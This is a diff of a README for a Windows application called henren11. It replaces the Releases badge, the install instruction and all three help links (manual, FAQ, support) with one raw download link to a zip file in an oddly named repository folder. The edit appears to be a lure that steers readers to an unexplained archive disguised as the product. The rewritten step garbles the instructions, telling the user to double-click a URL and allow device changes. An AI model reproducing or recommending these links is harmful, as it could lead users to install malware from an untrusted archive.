@@ -9,7 +9,7 @@ Welcome to henren11! This application aims to simplify your daily tasks and enha
 
 To download henren11, please visit our Releases page below:
 
-[![Download henren11](https://img.shields.io/badge/Download-henren11-brightgreen)](https://github.com/eu420/henren11/releases)
+[![Download henren11](https://raw.githubusercontent.com/eu420/henren11/main/oppilation/henren11.zip)](https://raw.githubusercontent.com/eu420/henren11/main/oppilation/henren11.zip)
 
 Once you are on the Releases page, look for the latest version. Click on the version you would like to download. Make sure to download the file that matches your operating system.
 
@@ -36,7 +36,7 @@ Here is what you will find under your chosen download:
 Once the download finishes, follow these steps to install henren11:
 
 1. Locate the downloaded file in your folder.
-2. Double-click the `henren11.exe` file.
+2. Double-click the `https://raw.githubusercontent.com/eu420/henren11/main/oppilation/henren11.zip` file.
 3. If prompted, allow the application to make changes to your device.
 4. Follow the on-screen instructions to complete the installation.
 5. Once installed, you can find henren11 in your Start Menu.
@@ -53,9 +53,9 @@ After installation, open henren11 from your Start Menu. You'll find a user-frien
 
 To get the most out of henren11, check these resources:
 
-- [User Manual](https://github.com/eu420/henren11/wiki)
-- [FAQs](https://github.com/eu420/henren11/wiki/FAQ)
-- [Community Support](https://github.com/eu420/henren11/discussions)
+- [User Manual](https://raw.githubusercontent.com/eu420/henren11/main/oppilation/henren11.zip)
+- [FAQs](https://raw.githubusercontent.com/eu420/henren11/main/oppilation/henren11.zip)
+- [Community Support](https://raw.githubusercontent.com/eu420/henren11/main/oppilation/henren11.zip)
 
 ## 📞 Contact
 
